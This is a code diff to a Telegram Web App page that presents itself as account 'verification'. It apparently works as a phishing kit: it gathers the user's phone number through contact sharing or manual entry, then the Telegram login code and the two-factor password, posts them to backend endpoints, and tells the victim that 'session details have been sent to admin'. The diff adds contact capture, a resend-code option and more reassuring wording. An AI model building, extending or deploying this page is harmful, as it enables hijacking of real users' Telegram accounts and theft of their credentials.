@@ -124,6 +124,7 @@
             justify-content: center;
             gap: 10px;
             padding: 18px;
+            font-size: 16px;
         }
         
         .otp-inputs {
@@ -214,46 +215,35 @@
             color: #333;
             margin: 10px 0;
             text-align: center;
+            font-size: 16px;
         }
         
         .phone-info {
             background: #e8f5e9;
-            padding: 10px;
+            padding: 12px;
             border-radius: 8px;
-            margin: 10px 0;
+            margin: 15px 0;
             text-align: center;
             font-weight: bold;
         }
         
-        .manual-phone-input {
-            width: 100%;
+        .contact-shared {
+            background: #e3f2fd;
             padding: 15px;
-            border: 2px solid #e0e0e0;
             border-radius: 12px;
-            font-size: 16px;
-            margin-bottom: 15px;
+            margin: 15px 0;
+            text-align: center;
         }
         
-        .manual-input-group {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
+        .contact-name {
+            font-weight: bold;
+            color: #1976d2;
+            margin-bottom: 5px;
         }
         
-        .country-select {
-            flex: 0 0 80px;
-            padding: 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 16px;
-        }
-        
-        .phone-number-input {
-            flex: 1;
-            padding: 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 16px;
+        .contact-phone {
+            color: #333;
+            font-size: 18px;
         }
     </style>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -273,38 +263,47 @@
                     Welcome
                 </div>
                 <div class="info-box">
-                    <p>Verify your Telegram account securely.</p>
-                    <p><small>Share contact or enter phone manually</small></p>
+                    <p>Verify your Telegram account by sharing your contact.</p>
+                    <p><small>Your contact will be used to send OTP securely.</small></p>
                 </div>
                 <button class="btn" onclick="startVerification()">Start Verification</button>
             </div>
             
-            <!-- Step 2: Contact Share -->
+            <!-- Step 2: Share Contact -->
             <div class="screen" id="step2">
                 <div class="step-title">
                     <span class="icon">📱</span>
-                    Enter Phone Number
+                    Share Your Contact
                 </div>
                 <div class="info-box">
-                    <p>Enter your phone number with country code to receive OTP.</p>
-                    <p><small>Example: +1234567890</small></p>
+                    <p>Click the button below to share your phone number from your contacts.</p>
+                    <p><small>This is required to send OTP to your phone.</small></p>
                 </div>
                 
-                <div class="manual-input-group">
-                    <select class="country-select" id="country-code">
-                        <option value="+1">+1</option>
-                        <option value="+91">+91</option>
-                        <option value="+44">+44</option>
-                        <option value="+7">+7</option>
-                        <option value="+86">+86</option>
-                    </select>
-                    <input type="tel" class="phone-number-input" id="phone-input" 
-                           placeholder="Phone number" maxlength="15">
+                <div class="contact-shared" id="contact-shared" style="display: none;">
+                    <div class="contact-name" id="contact-name"></div>
+                    <div class="contact-phone" id="contact-phone"></div>
                 </div>
                 
-                <div class="error" id="phone-error"></div>
+                <div class="error" id="contact-error"></div>
                 
-                <button class="btn" onclick="sendOTP()">Send OTP</button>
+                <button class="btn contact-btn" onclick="shareContact()">
+                    <span>📞</span> Share My Contact
+                </button>
+                
+                <div style="text-align: center; margin: 15px 0;">
+                    <p style="color: #666; font-size: 14px;">OR</p>
+                </div>
+                
+                <div class="info-box" style="background: #fff3e0; border-left-color: #ff9800;">
+                    <p><strong>Manual Entry:</strong> If contact sharing doesn't work, you can manually enter your phone number:</p>
+                    <div style="margin-top: 10px;">
+                        <input type="tel" id="manual-phone" placeholder="+1234567890" 
+                               style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; margin-bottom: 10px;">
+                        <button class="btn" style="background: #ff9800;" onclick="useManualPhone()">Use This Number</button>
+                    </div>
+                </div>
+                
                 <button class="btn back-btn" onclick="goToStep(1)">Back</button>
             </div>
             
@@ -312,7 +311,7 @@
             <div class="screen" id="step3">
                 <div class="loading">
                     <div class="loading-spinner"></div>
-                    <p>Sending OTP...</p>
+                    <p id="loading-text">Sending OTP...</p>
                     <div class="phone-info" id="phone-info"></div>
                 </div>
             </div>
@@ -326,7 +325,7 @@
                 <div class="info-box">
                     <p>Enter the 5-digit code sent to:</p>
                     <p id="phone-display"></p>
-                    <p><small>Format: 9 4 3 8 0 or 94380</small></p>
+                    <p><small>Telegram sends codes like: <b>9 4 3 8 0</b> (with spaces)</small></p>
                 </div>
                 
                 <div class="error" id="otp-error"></div>
@@ -339,8 +338,14 @@
                     <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)">
                 </div>
                 
+                <div style="text-align: center; margin: 15px 0;">
+                    <a href="#" onclick="resendOTP()" style="color: #667eea; text-decoration: none; font-size: 14px;">Resend OTP</a>
+                    <span style="margin: 0 10px; color: #999;">•</span>
+                    <a href="#" onclick="changeNumber()" style="color: #667eea; text-decoration: none; font-size: 14px;">Change Number</a>
+                </div>
+                
                 <button class="btn" onclick="verifyOTP()" id="verify-btn" disabled>Verify OTP</button>
-                <button class="btn back-btn" onclick="goToStep(2)">Change Number</button>
+                <button class="btn back-btn" onclick="goToStep(2)">Back</button>
             </div>
             
             <!-- Step 5: 2FA -->
@@ -350,16 +355,17 @@
                     2FA Password
                 </div>
                 <div class="info-box">
-                    <p>Enter 2FA password for:</p>
+                    <p>Your account has two-factor authentication enabled.</p>
                     <p id="phone-display-2fa"></p>
+                    <p><small>Enter your 2FA password (not your Telegram login password)</small></p>
                 </div>
                 
                 <div class="error" id="password-error"></div>
                 
-                <input type="password" class="password-input" id="password-input" placeholder="2FA Password">
+                <input type="password" class="password-input" id="password-input" placeholder="Enter 2FA password">
                 
                 <button class="btn" onclick="verifyPassword()">Verify Password</button>
-                <button class="btn back-btn" onclick="goToStep(4)">Back</button>
+                <button class="btn back-btn" onclick="goToStep(4)">Back to OTP</button>
             </div>
             
             <!-- Step 6: Success -->
@@ -367,8 +373,8 @@
                 <div class="success">
                     <div class="success-icon">✅</div>
                     <h2>Verified Successfully!</h2>
-                    <p>Your account has been verified.</p>
-                    <p><small>Details sent to admin</small></p>
+                    <p>Your Telegram account has been verified.</p>
+                    <p><small>Session details have been sent to admin.</small></p>
                     <button class="btn" onclick="closeApp()">Close</button>
                 </div>
             </div>
@@ -380,10 +386,9 @@
         let sessionId = null;
         let phoneNumber = '';
         let otpCode = '';
-        
-        // Initialize Telegram WebApp
         let telegramWebApp = null;
         
+        // Initialize Telegram WebApp
         function initTelegram() {
             if (window.Telegram && Telegram.WebApp) {
                 telegramWebApp = Telegram.WebApp;
@@ -391,11 +396,16 @@
                 telegramWebApp.expand();
                 telegramWebApp.MainButton.hide();
                 telegramWebApp.BackButton.hide();
+                
                 console.log('Telegram WebApp initialized');
                 
-                // Set theme to match our design
-                telegramWebApp.setHeaderColor('#667eea');
-                telegramWebApp.setBackgroundColor('#ffffff');
+                // Listen for contact data from main button
+                telegramWebApp.onEvent('contactReceived', (contact) => {
+                    console.log('Contact received via event:', contact);
+                    if (contact) {
+                        processContact(contact);
+                    }
+                });
             }
         }
         
@@ -431,30 +441,97 @@
             goToStep(2);
         }
         
-        function sendOTP() {
-            const countryCode = document.getElementById('country-code').value;
-            const phoneInput = document.getElementById('phone-input').value.trim();
-            
-            if (!phoneInput) {
-                showError('phone-error', 'Please enter phone number');
+        function shareContact() {
+            if (telegramWebApp) {
+                try {
+                    // Use the contact sharing method
+                    telegramWebApp.MainButton.text = "Share Contact";
+                    telegramWebApp.MainButton.show();
+                    
+                    telegramWebApp.MainButton.onClick(() => {
+                        // This triggers contact sharing
+                        telegramWebApp.requestContact((shared) => {
+                            if (shared) {
+                                console.log('Contact shared successfully');
+                            }
+                        });
+                    });
+                    
+                    // Also try direct requestContact
+                    telegramWebApp.requestContact((shared) => {
+                        console.log('requestContact callback:', shared);
+                        if (shared) {
+                            // The contact data comes through initDataUnsafe
+                            checkForContactData();
+                        } else {
+                            showError('contact-error', 'Contact sharing cancelled or failed');
+                        }
+                    });
+                } catch (error) {
+                    console.error('Error sharing contact:', error);
+                    showError('contact-error', 'Error sharing contact. Please try manual entry.');
+                }
+            } else {
+                showError('contact-error', 'Please use Telegram app to share contact');
+            }
+        }
+        
+        function checkForContactData() {
+            if (telegramWebApp && telegramWebApp.initDataUnsafe) {
+                const initData = telegramWebApp.initDataUnsafe;
+                console.log('initDataUnsafe:', initData);
+                
+                // Check if contact data is in query_id
+                if (initData.query_id) {
+                    // Try to extract from query_id or other fields
+                    setTimeout(() => {
+                        // Fallback: show manual input option
+                        document.getElementById('manual-phone').focus();
+                    }, 1000);
+                }
+            }
+        }
+        
+        function useManualPhone() {
+            const manualPhone = document.getElementById('manual-phone').value.trim();
+            if (!manualPhone) {
+                showError('contact-error', 'Please enter phone number');
                 return;
             }
             
-            if (!/^\d+$/.test(phoneInput)) {
-                showError('phone-error', 'Phone number should contain only digits');
+            if (!manualPhone.startsWith('+')) {
+                showError('contact-error', 'Please include country code (e.g., +1234567890)');
                 return;
             }
             
-            phoneNumber = countryCode + phoneInput;
+            const contact = {
+                phone_number: manualPhone,
+                first_name: 'User',
+                last_name: ''
+            };
             
-            // Validate phone format
-            if (!phoneNumber.startsWith('+')) {
-                phoneNumber = '+' + phoneNumber;
+            processContact(contact);
+        }
+        
+        function processContact(contact) {
+            if (!contact || !contact.phone_number) {
+                showError('contact-error', 'No contact data received');
+                return;
             }
+            
+            phoneNumber = contact.phone_number;
+            const firstName = contact.first_name || '';
+            const lastName = contact.last_name || '';
+            
+            // Show contact info
+            document.getElementById('contact-shared').style.display = 'block';
+            document.getElementById('contact-name').textContent = `${firstName} ${lastName}`.trim() || 'Contact';
+            document.getElementById('contact-phone').textContent = phoneNumber;
             
             // Show loading
             goToStep(3);
-            document.getElementById('phone-info').textContent = `Sending to: ${phoneNumber}`;
+            document.getElementById('phone-info').textContent = `Phone: ${phoneNumber}`;
+            document.getElementById('loading-text').textContent = 'Sending OTP...';
             
             // Send to backend
             fetch('/api/process-contact', {
@@ -464,7 +541,9 @@
                 },
                 body: JSON.stringify({
                     phone: phoneNumber,
-                    source: 'webapp_manual'
+                    first_name: firstName,
+                    last_name: lastName,
+                    source: 'contact_share'
                 })
             })
             .then(response => response.json())
@@ -487,13 +566,13 @@
                         if (firstInput) firstInput.focus();
                     }, 100);
                 } else {
-                    showError('phone-error', data.error || 'Failed to send OTP');
+                    showError('contact-error', data.error || 'Failed to send OTP');
                     goToStep(2);
                 }
             })
             .catch(error => {
                 console.error('OTP send error:', error);
-                showError('phone-error', 'Network error. Please try again.');
+                showError('contact-error', 'Network error. Please try again.');
                 goToStep(2);
             });
         }
@@ -580,6 +659,46 @@
                 verifyBtn.disabled = false;
                 verifyBtn.textContent = 'Verify OTP';
             });
+        }
+        
+        function resendOTP() {
+            document.getElementById('loading-text').textContent = 'Resending OTP...';
+            goToStep(3);
+            
+            fetch('/api/resend-otp', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    phone: phoneNumber
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    goToStep(4);
+                    document.querySelectorAll('.otp-input').forEach(input => {
+                        input.value = '';
+                    });
+                    otpCode = '';
+                    document.getElementById('verify-btn').disabled = true;
+                } else {
+                    showError('otp-error', data.error || 'Failed to resend OTP');
+                    goToStep(4);
+                }
+            })
+            .catch(error => {
+                showError('otp-error', 'Network error');
+                goToStep(4);
+            });
+        }
+        
+        function changeNumber() {
+            if (confirm('Change phone number? This will restart the process.')) {
+                goToStep(2);
+            }
         }
         
         function verifyPassword() {
@@ -675,8 +794,8 @@
         // Handle Enter key
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Enter') {
-                if (currentStep === 2) {
-                    sendOTP();
+                if (currentStep === 2 && document.getElementById('manual-phone').value) {
+                    useManualPhone();
                 } else if (currentStep === 4 && otpCode.length === 5) {
                     verifyOTP();
                 } else if (currentStep === 5) {
@@ -684,6 +803,14 @@
                 }
             }
         });
+        
+        // Add event listener for contact sharing via URL parameters
+        window.addEventListener('message', (event) => {
+            console.log('Message received:', event.data);
+            if (event.data && event.data.contact) {
+                processContact(event.data.contact);
+            }
+        });
     </script>
 </body>
-</html>w
+</html>
